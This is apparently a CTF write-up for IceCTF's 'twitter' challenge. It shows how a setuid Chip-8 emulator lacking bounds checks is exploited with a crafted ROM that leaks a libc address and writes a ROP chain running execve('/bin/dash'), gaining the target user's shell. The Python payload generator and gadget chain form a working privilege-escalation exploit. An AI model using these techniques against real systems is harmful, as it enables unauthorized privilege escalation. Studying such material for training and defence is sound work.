# Binary Exploitation - 6. Twitter

[Solve script](solve.py)

## Points

800

## Description

> Someone left a time machine in the basement with classic games from the 1970s. Let me play these on the job, nothing can go wrong.

## Remarks

This was hard.

## Difficulty

Hard

## Initial experimentation

We are given a binary to download and an ssh connection containing the binary and a collection of `.ROM` files. There is no `flag.txt` file, making the challenge goal a bit unclear. Running `ls -l twitter`, we see that the binary is owned by a user called `target` and the setuid bit is set.

```
-rwsr-xr-x. 1 target target 31104 Sep 11 11:04 twitter
```

Sure enough, our `adversary` user doesn't have permission to access `/home/target`, meaning the flag is probably stashed in there.

So we need to escalate from `adversary` to `target`.

From the problem description and by searching some of the ROM names, we can determine that `twitter` is a Chip-8 emulator (what even is that?). Running `./twitter`, we can see the below message.

```
Usage: ./twitter <ROM image>
Use the following keys for navigation:
|1|2|3|4|
|Q|W|E|R|
|A|S|D|F|
|Z|X|C|V|
```

We can call `./twitter *rom name*` to ~~get distracted by~~ play some of the games. Since the ROM files are the only relevant input to the program, we can guess that the solution would be running `./twitter` on a `PAYLOAD.ROM` that gives a shell and lets us view `/home/target`.

## Finding the vulnerability

Running checksec on the binary shows this output:

```
➜  twitter checksec -f twitter 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	FORTIFY	Fortified Fortifiable  FILE
Partial RELRO   No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   No	0		4	twitter
```

The only unhardened security settings are partial RELRO and lack of stack canaries. Partial RELRO is the default, but lack of stack smash protection isn't. This means that the challenge creator made a point to compile with `-fno-stack-protector`. Already, we can take a guess that this challenge involves ROP.

I also took a guess that the vulnerability was that the emulator could read and write outside the emulator's designated program memory. I went on the unofficial, but excellent Chip-8 [reference](http://devernay.free.fr/hacks/chip8/C8TECH10.HTM) by Cowgod. I did a quick search on the page for "address."

> There is also a 16-bit register called I. This register is generally used to store memory addresses, so only the lowest (rightmost) 12 bits are usually used.

This sounds suspicious 🤔. If the 4 upper bits *are* used, could we perform a read to bypass ASLR and a write to overwrite the return address?

```
+---------------+= 0xFFF (4095) End of Chip-8 RAM
|               |
|               |
|               |
|               |
|               |
| 0x200 to 0xFFF|
|     Chip-8    |
| Program / Data|
|     Space     |
|               |
|               |
|               |
+- - - - - - - -+= 0x600 (1536) Start of ETI 660 Chip-8 programs
|               |
|               |
|               |
+---------------+= 0x200 (512) Start of most Chip-8 programs
| 0x000 to 0x1FF|
| Reserved for  |
|  interpreter  |
+---------------+= 0x000 (0) Start of Chip-8 RAM
```

This memory layout diagram shows that the Chip-8 RAM is only 4095 bytes, yet the pointer register `I` is 16 bits. It is easy to imagine that a lazy emulator author (or a CTF challenge creator) would not worry about out-of-bounds checking.

Now, we actually need to reverse the binary, both to confirm that it has this vulnerability, and to measure offsets of the return address and a pointer to somewhere in libc to bypass ASLR.

To make reversing easier, we can look at the Chip-8 struct constructor code in `Chip8::Chip8(Screen*,Keyboard*)` and try to deduce the struct format.

### Chip-8 struct

```
struct chip8 {
	void *screen; // 0
	void *keyboard; // 8
	uint8_t V[0x10]; // 0x10
	uint8_t mem[0x1000]; // 0x20
	uint16_t I; // 0x1020
	uint16_t pc; // 0x1022
	uint8_t unknown1; // 0x1024
	uint8_t unknown2; // 0x1025
	uint8_t unknown3[0x20]; // 0x1026
} __attribute__((packed));
```

This information makes reversing parts of the emulator loop much easier. The `Chip8::Step()` method emulates one Chip-8 instruction. It uses nested branching and switch statements to dispatch instructions, which is a bit unwieldy, but I was eventually able to find the code for emulating `ADD I, Vx`. It did not perform bounds checking. I checked `LD [I], Vx` and `LD Vx, [I]`, the opcodes for loading and storing to and from memory. Again, there is no bounds checking code. At this point, the exploit idea was confirmed.

## More information gathering

There was no shell-giving function compiled into the binary, so ret2libc was necessary. I ran `ldd twitter` to find the libc that was being used, and I snagged the libc to my local machine. Running `one_gadget` on the libc, we can see that it has three one-gadgets that we can jump to for getting a shell.

The next step was to find the value that `I` had to be set to to seek the return address and the leak of ASLR. Using the radare2 local variables display and the reversed struct layout, we can find that `I` should be set to 6360 for the return address, since the beginning of emulator memory is at `rbp-0x18f0+0x20` and the return address is at `rbp+0x8`.

```
; var int local_18f8h @ rbp-0x18f8                                 
; var int chip8 @ rbp-0x18f0                                       
; var int keyboard @ rbp-0x8a0                                     
; var int screen @ rbp-0x850                                       
; var int local_40h @ rbp-0x40                                     
; var int local_11h @ rbp-0x11                                     
```

To leak ASLR, I opened the binary in gdb and used the `telescope $rbp` command to dump the stack.

```
6392| 0x7fffffffe058 --> 0x7ffff7a59223 (<__libc_start_main+241>:	mov    edi,eax)
```

This points inside a libc function, allowing ASLR to be thwarted. Subtracting the offset from `$rbp` of the beginning of emulated process memory, we can get the value that `I` must be to read the ASLR leak: 0x18f8.

## Pwning

So we need to make an evil Chip-8 binary which will:

1. Read the ASLR leak from the stack
2. Add the distance to the one-gadget
3. Write the result to the return address

To accomplish this, I wrote a script for generating redundant parts of the payload, essentially using Python functions as assembler macros.

```
# Set I to the value of off
def seek_I(off):
    assert off > 0xfff
    assert off < 2 ** 16
    p = ''
    # Set I to off
    p += '\xAf\xff' # LD I, 0xfff
    reg_I = 0xfff
    while reg_I < off:
        if off - reg_I < 0xff:
            p += '\x6a' + chr(off - reg_I) # LD Va, (off - reg_I)
            reg_I += off - reg_I
        else:
            p += '\x6a\xff' # LD Va, 0xff
            reg_I += 0xff
        p += '\xfa\x1e' # ADD I, Va
    return p

# Read the 64 bit value at off into V0-V7
def read64(off):
    p = ''
    p += seek_I(off)
    p += '\xf7\x65' # LD V7, [I]
    return p

# Write the 64 bit value in V0-V7 to off
def write64(off):
    p = ''
    p += seek_I(off)
    p += '\xf7\x55' # LD [I], V7
    return p

# Add the immediate val to the 64 bit value stored in V0-V7
def add64i(val):
    p = ''
    p += '\x68' + p64(val)[0] # LD V8, p64(val)[0]
    p += '\x80\x84' # ADD V0, V8
    p += '\x89\xf0' # LD V9, Vf
    p += '\x81\x94' # ADD, V1, V9
    p += '\x68' + p64(val)[1] # LD V8, p64(val)[1]
    p += '\x81\x84' # ADD V1, V8
    p += '\x89\xf0' # LD V9, Vf
    p += '\x82\x94' # ADD, V2, V9
    p += '\x68' + p64(val)[2] # LD V8, p64(val)[2]
    p += '\x82\x84' # ADD V2, V8
    p += '\x89\xf0' # LD V9, Vf
    p += '\x83\x94' # ADD, V3, V9
    p += '\x68' + p64(val)[3] # LD V8, p64(val)[3]
    p += '\x83\x84' # ADD V3, V8
    p += '\x89\xf0' # LD V9, Vf
    p += '\x84\x94' # ADD, V4, V9
    p += '\x68' + p64(val)[4] # LD V8, p64(val)[4]
    p += '\x84\x84' # ADD V4, V8
    p += '\x89\xf0' # LD V9, Vf
    p += '\x85\x94' # ADD, V5, V9
    p += '\x68' + p64(val)[5] # LD V8, p64(val)[5]
    p += '\x85\x84' # ADD V5, V8
    p += '\x89\xf0' # LD V9, Vf
    p += '\x86\x94' # ADD, V6, V9
    p += '\x68' + p64(val)[6] # LD V8, p64(val)[6]
    p += '\x86\x84' # ADD V6, V8
    p += '\x89\xf0' # LD V9, Vf
    p += '\x87\x94' # ADD, V7, V9
    p += '\x68' + p64(val)[7] # LD V8, p64(val)[7]
    p += '\x87\x84' # ADD V7, V8
    return p

p = ''
p += read64(leak_loc_off)
p += add64i(one_gadget_off - leak_off)
p += write64(ret_addr_off)
p += '\x00\xfd' # EXIT

print 'Writing payload to ROM...'
with open('PAYLOAD.ROM', 'w') as f:
    f.write(p)
print 'PAYLOAD.ROM written'
```

`Vf` here is the carry register, which is 1 when the previous operation overflowed.

The addition code didn't initially work as planned and needed debugging. One debugging technique I used which was immensely helpful was putting the reversed struct in `types.h` and following the instructions [here](https://gist.github.com/logc/c37ef4f5604430bfbf5625bf7546d4cd) so gdb can print the state of the emulated CPU at each instruction.

After many failed attempts and debugging, I finally got a shell!

```
[adversary ~]$ ./twitter PAYLOAD.ROM
bash4.4$
```

## Apparently I wasn't done

After seeing the shell, I ran `whoami` to confirm that I was the `target` user.

```
bash4.4$ whoami
adversary
```

At this point, I assumed the challenge was broken and contacted an organizer.

The organizer insisted that the challenge wasn't broken.

> yes
> correct, you have find some way to maintain the uid

After a bit of digging I found this on [StackOverflow](https://superuser.com/questions/532121/what-does-p-do-on-shell-script):

> If Bash is started with the effective user (group) id not equal to the real user (group) id, and the `-p` option is not supplied, no startup files are read, shell functions are not inherited from the environment, the SHELLOPTS, BASHOPTS, CDPATH, and GLOBIGNORE variables, if they appear in the environment, are ignored, and the effective user id is set to the real user id. If the `-p` option is supplied at invocation, the startup behavior is the same, but the effective user id is not reset.

Looking at `/bin` on the ssh server, I saw that `dash` was installed, which does not have this issue. I had two options at that point. I could call `bash` with the `-p` flag, or I could call `dash`. Either one would require a ropchain more complex than just a simple one-gadget, but I decided on calling `dash`.

## Forging the ropchain

I used ROPgadget to dump gadgets from the libc.

```
ROPgadget --binary libc.so.6 --all --ropchain > gadgets.txt
```

The `--ropchain` flag automatically generates a ropchain, but it isn't useful by itself for this case, because it calls `/bin/sh` and not `/bin/dash`. Still, the ropchain can be modified to call `dash` instead. Additionally, I made sure that all the gadgets had higher addresses than the leaked libc address, because I didn't want to spend time debugging bad Chip-8 subtraction code.

### The ropchain

#### Invoke `execve("/bin/dash", "", "")`

```
0x000f5295: pop rdx ; ret
0x00399080: @ .data
0x00035578: pop rax ; ret
'/bin/das'
0x0002c42c: mov qword ptr [rdx], rax ; ret
0x00058552: pop rdx ; ret
0x00399088: @ .data + 8
0x00035578: pop rax ; ret
'h\x00\x00\x00\x00\x00\x00\x00'
0x0002c42c: mov qword ptr [rdx], rax ; ret
0x00101461: pop rdi ; ret
0x00399080: @ .data
0x0011b879: pop rsi ; ret
0x00399089: @ .data + 9
0x000f5295: pop rdx ; ret
0x00399089: @ .data + 9
0x00035578: pop rax ; ret
p64(59)
0x000a87e5: syscall ; ret
```

## More failure

I created more Python assembly macros to aid in making the ropchain-writing code.

```
# Use a stack leak to compute the absolute address of a gadget at `off` and
# place it on the ropchain. `ropchain_len` is the current length of the
# ropchain in qwords.
def rel_gad(ropchain_len, off):
    assert off > leak_off
    p = ''
    p += read64(leak_loc_off)
    p += add64i(off - leak_off)
    p += write64(ret_addr_off + ropchain_len * 8)
    return p

# Add `data` to the ropchain verbatim
def abs_gad(ropchain_len, data):
    p = ''
    p += ld64(data)
    p += write64(ret_addr_off + ropchain_len * 8)
    return p

p = ''
# leak_off:      0x00020431
p += rel_gad( 0, 0x000f5295)
p += rel_gad( 1, 0x00399080)
p += rel_gad( 2, 0x00035578)
p += abs_gad( 3, u64('/bin/das'))
p += rel_gad( 4, 0x0002c42c)
p += rel_gad( 5, 0x00058552)
p += rel_gad( 6, 0x00399088)
p += rel_gad( 7, 0x00035578)
p += abs_gad( 8, u64('h\x00\x00\x00\x00\x00\x00\x00'))
p += rel_gad( 9, 0x0002c42c)
p += rel_gad(10, 0x00101461)
p += rel_gad(11, 0x00399080)
p += rel_gad(12, 0x0011b879)
p += rel_gad(13, 0x00399089)
p += rel_gad(14, 0x000f5295)
p += rel_gad(15, 0x00399089)
p += rel_gad(16, 0x00035578)
p += abs_gad(17, 59)
p += rel_gad(18, 0x000a87e5)
p += '\x00\xfd' # EXIT
```

It segfaulted.

## More debugging

After several tests, tweaking, and debugging, I figured out that the ropchain was being corrupted after 5 qwords, but only the sections of the ropchain that required leaking ASLR.

Eventually, I realized that the ropchain was clobbering the leak location, since the address I was using to leak was after the return address.

Bamboozled by statefulness yet again, I guess this is why some people prefer functional programming.

## The final fix

I patched my exploit by adding a section of code at the beginning that copied the address at the leak location to a higher area on the stack so it could not be clobbered.

```
# Moves the leak used to bypass ASLR to a lower address to prevent clobbering
# by the ropchain
def setup_leak():
    p = ''
    p += read64(far_leak_loc_off)
    p += write64(near_leak_loc_off)
    return p
```

```
[adversary ~]$ ./twitter PAYLOAD.ROM
$ whoami
target
$ cd ../target
$ ls
flag.txt
$ cat flag.txt
IceCTF{R0P_1977_styl3}
$
```

## Final thoughts

It remains unclear why this challenge is called "twitter." After thinking about it for a bit, I realized that "chip" sounds like "chirp." Both "chirp" and "twitter" are bird sounds. I tried to confirm this with one of the IceCTF organizers, but they claimed to have no idea about the reason for the challenge name. Apparently this challenge was not made by one of the organizers.

This challenge would (I think) still be solvable even if stack smash protection were enabled, since the stack writes don't necessarily have to overwrite the canary. Even if they did, the canary could always be leaked through stack reads.

This was hard.
